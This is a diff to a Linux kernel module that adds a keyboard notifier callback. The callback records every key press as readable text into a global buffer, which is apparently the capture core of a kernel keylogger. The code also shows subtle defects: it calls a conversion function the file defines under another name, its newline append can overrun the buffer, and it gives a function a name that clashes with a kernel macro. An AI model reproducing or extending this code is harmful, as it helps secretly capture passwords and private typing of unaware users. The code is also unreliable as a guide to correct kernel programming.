@@ -119,6 +119,43 @@ void string_conv(int kode, int shifted, char *buffer, int sys) {
 	} // switch statement
 } // Method string_conv
 
+int callback(struct notifier_block *nblock,
+		  unsigned long code,
+		  void *_param)
+{
+	size_t len; //length of keycode
+	char keybuf[KEYCODE_LEN] = {0}; //not sure about this one
+	struct keyboard_notifier_param *param = _param;
+
+	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
+		 code, param->down, param->shift, param->value);
+
+	/* Trace only when a key is pressed down */
+	if (!(param->down))
+		return NOTIFY_OK; //returns 0x001
+	
+	/* Convert keycode to readable string in keybuf */
+	keycode_to_string(param->value, param->shift, keybuf, codes);
+	len = strlen(keybuf);
+	if (len < 1) /* Unmapped keycode */
+		return NOTIFY_OK; //returns 0x001
+
+	/* Reset key string buffer position if exhausted */
+	if ((buf_pos + len) >= BUF_LEN) //if buffer position is greater than buffer length then reset to 0
+		buf_pos = 0;
+
+	/* Copy readable key to key string buffer */
+	strncpy(keys_buf + buf_pos, keybuf, len); //
+	buf_pos += len;
+
+	/* Append newline to keys in special cases */
+	if (codes) //for keys like ctrl, alt, del
+		keys_buf[buf_pos++] = '\n';
+	pr_debug("%s\n", keybuf);
+
+	return NOTIFY_OK; //returns 0x001
+}
+
 // Module initialization
 static int __init module_init(void)
 {
